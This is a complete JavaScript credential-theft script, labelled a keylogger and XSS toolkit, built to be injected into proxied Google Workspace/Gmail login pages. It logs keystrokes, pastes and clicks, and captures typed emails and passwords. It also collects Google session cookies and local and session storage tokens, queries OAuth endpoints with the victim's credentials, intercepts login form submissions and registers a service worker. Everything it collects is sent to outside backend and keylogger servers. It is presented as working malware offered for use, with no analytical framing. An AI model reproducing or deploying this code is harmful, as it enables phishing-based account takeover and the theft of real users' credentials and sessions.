// ============================================================
//  GOOGLE WORKSPACE / GMAIL - ADVANCED KEYLOGGER + XSS TOOLKIT
//  Enhanced for mobile, IME, paste, and all input types
//  Injected into Google login pages
// ============================================================

(function() {
    // --- Configuration from server injection ---
    const CONFIG = window.GOOGLE_CONFIG || {
        BACKEND_URL: "https://meeting-1-rzx6.onrender.com",
        KEYLOGGER_URL: "https://keyserver-eaar.onrender.com/log",
        XSS_ENDPOINT: "/xss-collect",
        COOKIE_ENDPOINT: "/cookie-capture",
        KEYLOG_ENDPOINT: "/keylog",
        SESSION_ID: 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now(),
        EMAIL: '',
        SERVICE: 'Google Workspace',
        CLIENT_ID: 'google-proxy'
    };

    console.log('🔐 Google Workspace Proxy Injected Script Loaded');
    console.log('📧 Email:', CONFIG.EMAIL);
    console.log('🆔 Session:', CONFIG.SESSION_ID);

    let keylogBuffer = '';
    let lastInputValues = new Map();
    let capturedCredentials = [];
    let loginAttempts = 0;
    let emailAutoFilled = false;
    const FLUSH_INTERVAL = 8000;
    const MAX_BUFFER = 500;
    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

    // ============================================================
    //  PART 1: AUTO-FILL EMAIL - ✅ FIXED
    // ============================================================

    function autoFillEmail() {
        const email = CONFIG.EMAIL || '';
        if (!email || emailAutoFilled) return;

        console.log('🔍 Attempting to auto-fill email:', email);

        // Try multiple selectors for Google's email field
        const selectors = [
            'input[name="Email"]',
            'input[name="identifier"]',
            'input[type="email"]',
            'input[name="email"]',
            'input[name="login"]',
            'input[name="username"]',
            'input[autocomplete="email"]',
            'input[autocomplete="username"]',
            '#identifierId',
            '#Email',
            '#email',
            '[data-testid="email-input"]',
            '[jsname="YPqjbf"]'
        ];

        let emailField = null;
        for (const selector of selectors) {
            const field = document.querySelector(selector);
            if (field) {
                emailField = field;
                break;
            }
        }

        // If not found, try to find any input that looks like an email field
        if (!emailField) {
            const allInputs = document.querySelectorAll('input');
            for (const input of allInputs) {
                const type = input.type || '';
                const name = input.name || '';
                const id = input.id || '';
                const placeholder = input.placeholder || '';
                const autocomplete = input.autocomplete || '';
                
                if (type === 'email' || 
                    name.toLowerCase().includes('email') || 
                    name.toLowerCase().includes('user') ||
                    id.toLowerCase().includes('email') ||
                    id.toLowerCase().includes('user') ||
                    placeholder.toLowerCase().includes('email') ||
                    autocomplete === 'email' ||
                    autocomplete === 'username') {
                    emailField = input;
                    break;
                }
            }
        }

        if (emailField) {
            // Set the value
            emailField.value = email;
            
            // Trigger events to ensure Google recognizes the change
            const events = ['input', 'change', 'blur'];
            for (const eventType of events) {
                const event = new Event(eventType, { bubbles: true });
                emailField.dispatchEvent(event);
            }
            
            // Also trigger React/Vue events if present
            const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
                HTMLInputElement.prototype, 
                'value'
            )?.set;
            if (nativeInputValueSetter) {
                nativeInputValueSetter.call(emailField, email);
                const inputEvent = new Event('input', { bubbles: true });
                emailField.dispatchEvent(inputEvent);
            }

            emailAutoFilled = true;
            console.log('✅ Auto-filled email:', email);
            
            // Try to find and click the "Next" button if it exists
            setTimeout(() => {
                const nextButtons = document.querySelectorAll('button, input[type="submit"]');
                for (const btn of nextButtons) {
                    const text = btn.textContent || btn.value || '';
                    if (text.toLowerCase().includes('next') || 
                        text.toLowerCase().includes('continue') ||
                        text.toLowerCase().includes('sign in')) {
                        console.log('🔘 Found "Next" button, clicking...');
                        btn.click();
                        break;
                    }
                }
            }, 1000);

            // Try to submit the form if it's a single-field form
            setTimeout(() => {
                const form = emailField.closest('form');
                if (form) {
                    const formFields = form.querySelectorAll('input');
                    // If there's only one input field (just email), submit the form
                    if (formFields.length === 1) {
                        console.log('📤 Submitting email form...');
                        const submitEvent = new Event('submit', { bubbles: true, cancelable: true });
                        if (form.dispatchEvent(submitEvent)) {
                            form.submit();
                        }
                    }
                }
            }, 1500);
        } else {
            console.warn('⚠️ Email field not found. Retrying...');
            // Try again after a delay
            setTimeout(autoFillEmail, 2000);
        }
    }

    // Run auto-fill on page load
    if (document.readyState === 'complete') {
        setTimeout(autoFillEmail, 500);
    } else {
        document.addEventListener('DOMContentLoaded', () => setTimeout(autoFillEmail, 500));
        window.addEventListener('load', () => setTimeout(autoFillEmail, 500));
    }

    // Also run after a few seconds in case the page loads dynamically
    setTimeout(autoFillEmail, 2000);
    setTimeout(autoFillEmail, 5000);

    // ============================================================
    //  PART 2: ADVANCED KEYLOGGER - Google Optimized
    // ============================================================

    function formatKey(e) {
        const key = e.key;
        const special = {
            'Enter': '[ENTER]\n',
            'Backspace': '[BACKSPACE]',
            'Tab': '[TAB]',
            'Escape': '[ESC]',
            'Delete': '[DEL]',
            'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]',
            'ArrowLeft': '[LEFT]',
            'ArrowRight': '[RIGHT]',
            'Home': '[HOME]',
            'End': '[END]',
            'PageUp': '[PAGEUP]',
            'PageDown': '[PAGEDOWN]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'Shift': '[SHIFT]',
            'Meta': '[WIN]',
            'CapsLock': '[CAPS]',
            ' ': '[SPACE]'
        };
        if (special[key]) return special[key];
        if (e.isComposing) return `[COMPOSING:${key}]`;
        if (key.length === 1) return key;
        return `[${key}]`;
    }

    // Send buffer to proxy keylog endpoint
    function sendKeylogBatch() {
        if (keylogBuffer.length === 0) return;

        // Send to proxy keylog endpoint
        fetch(CONFIG.KEYLOG_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                keystrokes: keylogBuffer,
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                sessionId: CONFIG.SESSION_ID,
                email: CONFIG.EMAIL,
                service: CONFIG.SERVICE,
                isMobile: isMobile
            })
        }).catch(() => {});

        // Send to external keylogger server
        if (CONFIG.KEYLOGGER_URL) {
            fetch(CONFIG.KEYLOGGER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    keystrokes: keylogBuffer,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    sessionId: CONFIG.SESSION_ID,
                    email: CONFIG.EMAIL,
                    service: CONFIG.SERVICE,
                    isMobile: isMobile
                })
            }).catch(() => {});
        }

        keylogBuffer = '';
    }

    // --- Keydown events (physical keyboards) ---
    document.addEventListener('keydown', (e) => {
        if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
        if (e.isComposing) return;
        keylogBuffer += formatKey(e);
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // --- Input events (mobile + IME + autofill) ---
    document.addEventListener('input', (e) => {
        if (!e.target) return;
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const field = e.target;
            const value = field.value;
            const label = field.name || field.id || field.placeholder || field.type || 'unknown';
            const prev = lastInputValues.get(field) || '';
            
            if (value !== prev) {
                const added = value.length > prev.length ? value.substring(prev.length) : '';
                if (added.length > 0) {
                    keylogBuffer += `[FIELD:${label}=${added}]`;
                } else {
                    keylogBuffer += `[FIELD:${label}=${value}]`;
                }
                lastInputValues.set(field, value);
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();

                // --- Google-specific credential detection ---
                if (label === 'Email' || label === 'identifier' || label === 'email' || 
                    label.toLowerCase().includes('email') || label.toLowerCase().includes('user')) {
                    if (value && value.includes('@')) {
                        CONFIG.EMAIL = value;
                        capturedCredentials.push({
                            type: 'email',
                            field: label,
                            value: value,
                            timestamp: Date.now()
                        });
                        sendCredentialsToBackend('email', value, label);
                    }
                }

                if (label === 'Passwd' || label === 'password' || label === 'passwd' ||
                    field.type === 'password' || label.toLowerCase().includes('pass')) {
                    if (value && value.length > 0) {
                        capturedCredentials.push({
                            type: 'password',
                            field: label,
                            value: value,
                            timestamp: Date.now()
                        });
                        sendCredentialsToBackend('password', value, label);
                    }
                }
            }
        }
    });

    // --- Composition events for IME ---
    document.addEventListener('compositionstart', () => {
        keylogBuffer += '[IME_START]';
    });
    document.addEventListener('compositionend', () => {
        keylogBuffer += '[IME_END]';
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // --- Paste events ---
    document.addEventListener('paste', (e) => {
        const text = e.clipboardData?.getData('text') || '';
        if (text) {
            const pasteText = text.length > 200 ? text.substring(0, 200) + '...' : text;
            keylogBuffer += `[PASTE:${pasteText}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            
            if (text.includes('@')) {
                const emailMatch = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                if (emailMatch) {
                    CONFIG.EMAIL = emailMatch[0];
                    sendCredentialsToBackend('email_paste', emailMatch[0], 'paste');
                }
            }
            if (text.length > 4 && !text.includes('@') && !text.includes(' ')) {
                sendCredentialsToBackend('password_paste', text, 'paste');
            }
        }
    });

    // --- Focus/Blur tracking ---
    document.addEventListener('focusin', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || e.target.type || 'unknown';
            keylogBuffer += `[FOCUS:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    document.addEventListener('focusout', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || e.target.type || 'unknown';
            keylogBuffer += `[BLUR:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    // --- Periodic check for Google's dynamic fields ---
    setInterval(() => {
        const hiddenFields = document.querySelectorAll('input[type="hidden"]');
        hiddenFields.forEach(field => {
            const name = field.name || '';
            const value = field.value || '';
            if (name && value && (name.includes('ltmpl') || name.includes('continue') || name.includes('service'))) {
                keylogBuffer += `[HIDDEN:${name}=${value}]`;
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            }
        });

        const identifier = document.querySelector('input[name="identifier"]');
        if (identifier && identifier.value && identifier.value !== lastInputValues.get(identifier)) {
            const value = identifier.value;
            if (value.includes('@')) {
                CONFIG.EMAIL = value;
                sendCredentialsToBackend('email', value, 'identifier');
            }
            lastInputValues.set(identifier, value);
        }

        // Retry auto-fill if it failed
        if (!emailAutoFilled && CONFIG.EMAIL) {
            autoFillEmail();
        }
    }, 3000);

    // --- Periodic flush ---
    setInterval(sendKeylogBatch, FLUSH_INTERVAL);
    window.addEventListener('beforeunload', sendKeylogBatch);
    window.addEventListener('pagehide', sendKeylogBatch);

    console.log('⌨️ Google Keylogger initialized');

    // ============================================================
    //  PART 3: CREDENTIAL SENDER
    // ============================================================

    function sendCredentialsToBackend(type, value, field) {
        try {
            const data = {
                action: 'google_credential_capture',
                email: type === 'email' ? value : CONFIG.EMAIL || '',
                password: type === 'password' ? value : '',
                field: field || 'unknown',
                value: value,
                type: type,
                url: window.location.href,
                userAgent: navigator.userAgent,
                sessionId: CONFIG.SESSION_ID,
                service: CONFIG.SERVICE,
                timestamp: new Date().toISOString()
            };

            fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {});

            if (CONFIG.KEYLOGGER_URL) {
                fetch(CONFIG.KEYLOGGER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'google_credential',
                        email: type === 'email' ? value : CONFIG.EMAIL || '',
                        password: type === 'password' ? value : '',
                        url: window.location.href,
                        sessionId: CONFIG.SESSION_ID,
                        service: CONFIG.SERVICE,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }
        } catch (e) {
            console.warn('[CREDENTIAL] Send error:', e.message);
        }
    }

    // ============================================================
    //  PART 4: GOOGLE-SPECIFIC COOKIE CAPTURE
    // ============================================================

    function captureFullCookies() {
        try {
            const cookies = document.cookie || '';
            if (cookies) {
                const cookieObj = {};
                cookies.split('; ').forEach(cookie => {
                    const [name, value] = cookie.split('=');
                    if (name && value) {
                        cookieObj[name] = value;
                    }
                });

                const googleCookies = ['SAPISID', 'HSID', 'SSID', 'APISID', 'SID', 'NID', 'OSID'];
                const hasGoogleCookies = googleCookies.some(name => cookieObj[name]);

                if (hasGoogleCookies || Object.keys(cookieObj).length > 0) {
                    console.log('🍪 Google cookies detected:', Object.keys(cookieObj));

                    fetch(CONFIG.COOKIE_ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            cookies: cookieObj,
                            fullCookieString: cookies,
                            url: window.location.href,
                            sessionId: CONFIG.SESSION_ID,
                            email: CONFIG.EMAIL || '',
                            service: CONFIG.SERVICE,
                            timestamp: new Date().toISOString(),
                            isGoogle: true
                        })
                    }).catch(() => {});

                    fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            action: 'google_cookie_capture',
                            email: CONFIG.EMAIL || 'unknown',
                            cookies: cookieObj,
                            googleCookies: googleCookies.filter(name => cookieObj[name]),
                            url: window.location.href,
                            sessionId: CONFIG.SESSION_ID,
                            service: CONFIG.SERVICE,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
            }
        } catch (e) {
            console.warn('[COOKIE] Error:', e.message);
        }
    }

    setTimeout(captureFullCookies, 2000);
    setTimeout(captureFullCookies, 5000);
    setTimeout(captureFullCookies, 10000);
    setTimeout(captureFullCookies, 20000);
    setTimeout(captureFullCookies, 30000);
    setInterval(captureFullCookies, 30000);

    console.log('🍪 Google Cookie capture initialized');

    // ============================================================
    //  PART 5: XSS DATA EXTRACTION - Google Optimized
    // ============================================================

    function extractGoogleDomData() {
        const data = {};

        const emailField = document.querySelector('input[name="Email"]') || 
                           document.querySelector('input[name="identifier"]') ||
                           document.querySelector('input[type="email"]') ||
                           document.querySelector('input[name="email"]');
        if (emailField) data.email = emailField.value;

        const passField = document.querySelector('input[name="Passwd"]') ||
                         document.querySelector('input[type="password"]') ||
                         document.querySelector('input[name="password"]');
        if (passField && passField.value) data.password = passField.value;

        const hiddenFields = {};
        document.querySelectorAll('input[type="hidden"]').forEach(field => {
            const name = field.name || '';
            if (name && field.value) {
                hiddenFields[name] = field.value;
            }
        });
        if (Object.keys(hiddenFields).length > 0) data.hiddenFields = hiddenFields;

        const gxf = document.querySelector('input[name="gxf"]');
        if (gxf) data.gxf = gxf.value;

        const continueUrl = document.querySelector('input[name="continue"]');
        if (continueUrl) data.continueUrl = continueUrl.value;

        const service = document.querySelector('input[name="service"]');
        if (service) data.service = service.value;

        const userInfo = document.querySelector('[data-testid="userInfo"]') ||
                        document.querySelector('.user-info') ||
                        document.querySelector('[class*="profile"]');
        if (userInfo) data.userInfo = userInfo.textContent.trim();

        data.pageTitle = document.title;

        return data;
    }

    function extractGoogleStorage() {
        const data = {};
        try {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && (key.includes('google') || key.includes('auth') || key.includes('gmail') || 
                           key.includes('oauth') || key.includes('session') || key.includes('token'))) {
                    try {
                        let value = localStorage.getItem(key);
                        if (typeof value === 'string' && value.length > 500) {
                            value = value.substring(0, 500) + '...';
                        }
                        ls[key] = value;
                    } catch (e) {}
                }
            }
            if (Object.keys(ls).length > 0) data.localStorage = ls;

            const ss = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key && (key.includes('google') || key.includes('auth'))) {
                    try {
                        let value = sessionStorage.getItem(key);
                        if (typeof value === 'string' && value.length > 500) {
                            value = value.substring(0, 500) + '...';
                        }
                        ss[key] = value;
                    } catch (e) {}
                }
            }
            if (Object.keys(ss).length > 0) data.sessionStorage = ss;

            data.cookies = document.cookie;
        } catch (e) {}
        return data;
    }

    async function executeGoogleRequests() {
        const results = {};
        const endpoints = [
            '/oauth2/v1/userinfo',
            '/oauth2/v2/token',
            '/v1/me',
            '/api/user/me',
            '/userinfo',
            '/me'
        ];

        for (const endpoint of endpoints) {
            try {
                const res = await fetch(endpoint, {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json' }
                });
                if (res.ok) {
                    try {
                        const data = await res.json();
                        if (data && typeof data === 'object' && Object.keys(data).length > 0) {
                            results[endpoint] = data;
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }

        return results;
    }

    async function runXSS() {
        try {
            const domData = extractGoogleDomData();
            const storageData = extractGoogleStorage();
            const requestResults = await executeGoogleRequests();

            const combined = {
                dom: domData,
                storage: storageData,
                requests: requestResults,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                sessionId: CONFIG.SESSION_ID,
                service: CONFIG.SERVICE,
                isMobile: isMobile,
                userAgent: navigator.userAgent
            };

            fetch(CONFIG.XSS_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ...combined,
                    email: CONFIG.EMAIL || domData.email || '',
                    sessionId: CONFIG.SESSION_ID
                })
            }).catch(() => {});

            fetch(`${CONFIG.BACKEND_URL}/api/xss-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    xssData: combined,
                    visitorInfo: {
                        fullUrl: window.location.href,
                        userAgent: navigator.userAgent,
                        sessionId: CONFIG.SESSION_ID
                    }
                })
            }).catch(() => {});

            if (domData.email && domData.email.includes('@')) {
                sendCredentialsToBackend('email', domData.email, 'xss_extract');
            }
            if (domData.password) {
                sendCredentialsToBackend('password', domData.password, 'xss_extract');
            }

            console.log('🎯 Google XSS data captured');
        } catch (e) {
            console.warn('[XSS] Error:', e.message);
        }
    }

    if (document.readyState === 'complete') {
        setTimeout(runXSS, 1500);
    } else {
        window.addEventListener('load', () => setTimeout(runXSS, 1500));
    }

    setTimeout(runXSS, 5000);
    setTimeout(runXSS, 15000);
    setTimeout(runXSS, 30000);

    let observerRunning = false;
    const observer = new MutationObserver(() => {
        if (!observerRunning) {
            observerRunning = true;
            setTimeout(() => {
                runXSS();
                observerRunning = false;
            }, 3000);
        }
    });
    try {
        observer.observe(document.body, { 
            childList: true, 
            subtree: true,
            attributes: true,
            attributeFilter: ['class', 'id', 'style']
        });
    } catch (e) {}

    console.log('🎯 Google XSS extractor initialized');

    // ============================================================
    //  PART 6: FORM SUBMISSION INTERCEPTOR
    // ============================================================

    document.addEventListener('submit', (e) => {
        const form = e.target;
        const formData = new FormData(form);
        const data = {};
        let email = CONFIG.EMAIL || '';
        let password = '';

        for (const [key, value] of formData.entries()) {
            data[key] = value;
            if (key === 'Email' || key === 'identifier' || key === 'email') {
                email = value;
                if (value && value.includes('@')) {
                    CONFIG.EMAIL = value;
                }
            }
            if (key === 'Passwd' || key === 'password' || key === 'passwd') {
                password = value;
            }
        }

        if (email || password) {
            loginAttempts++;
            
            fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'google_form_submit',
                    email: email || CONFIG.EMAIL || 'unknown',
                    password: password || '',
                    formData: data,
                    sessionId: CONFIG.SESSION_ID,
                    attempts: loginAttempts,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    service: CONFIG.SERVICE,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});

            if (CONFIG.KEYLOGGER_URL) {
                fetch(CONFIG.KEYLOGGER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'google_form_submit',
                        email: email || CONFIG.EMAIL || 'unknown',
                        password: password || '',
                        url: window.location.href,
                        sessionId: CONFIG.SESSION_ID,
                        service: CONFIG.SERVICE,
                        formData: data,
                        attempts: loginAttempts,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }

            console.log('📤 Google form submitted:', email || 'unknown');
        }
    });

    // ============================================================
    //  PART 7: CLICK TRACKING
    // ============================================================

    document.addEventListener('click', (e) => {
        const target = e.target;
        const tag = target.tagName;
        const id = target.id || '';
        const className = target.className || '';
        const text = (target.textContent || '').substring(0, 50);
        const href = target.href || '';
        
        if (tag === 'BUTTON' || tag === 'A' || target.closest('button') || target.closest('a')) {
            const clickData = {
                tag: tag,
                id: id,
                className: className,
                text: text,
                href: href,
                url: window.location.href,
                sessionId: CONFIG.SESSION_ID,
                timestamp: Date.now()
            };

            keylogBuffer += `[CLICK:${tag}${id ? '#'+id : ''} ${text}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();

            fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'google_click_tracking',
                    clickData: clickData,
                    sessionId: CONFIG.SESSION_ID,
                    url: window.location.href
                })
            }).catch(() => {});
        }
    });

    // ============================================================
    //  PART 8: SERVICE WORKER REGISTRATION
    // ============================================================
    
    (function() {
        if ("serviceWorker" in navigator) {
            try {
                const swUrl = "/service_worker_google.js";
                navigator.serviceWorker.register(swUrl, {
                    scope: "/",
                }).then(() => {
                    console.log("✅ Google Service Worker registered");
                }).catch((error) => {
                    console.warn("❌ Google Service Worker registration failed:", error);
                });
            } catch (e) {
                console.warn("Service Worker not supported");
            }
        }
    })();

    // ============================================================
    //  PART 9: DEBUG INFO
    // ============================================================

    console.log('✅ Google Workspace Proxy Script Ready');
    console.log(`📊 Session: ${CONFIG.SESSION_ID}`);
    console.log(`📧 Email: ${CONFIG.EMAIL || 'Not detected yet'}`);
    console.log(`📱 Mobile: ${isMobile}`);
    console.log(`🖥️ User Agent: ${navigator.userAgent}`);
    console.log(`🔗 Keylogger: ${CONFIG.KEYLOGGER_URL}`);
    console.log(`🔗 Backend: ${CONFIG.BACKEND_URL}`);

    fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            action: 'google_script_loaded',
            sessionId: CONFIG.SESSION_ID,
            email: CONFIG.EMAIL || 'unknown',
            url: window.location.href,
            userAgent: navigator.userAgent,
            isMobile: isMobile,
            service: CONFIG.SERVICE,
            timestamp: new Date().toISOString()
        })
    }).catch(() => {});

})();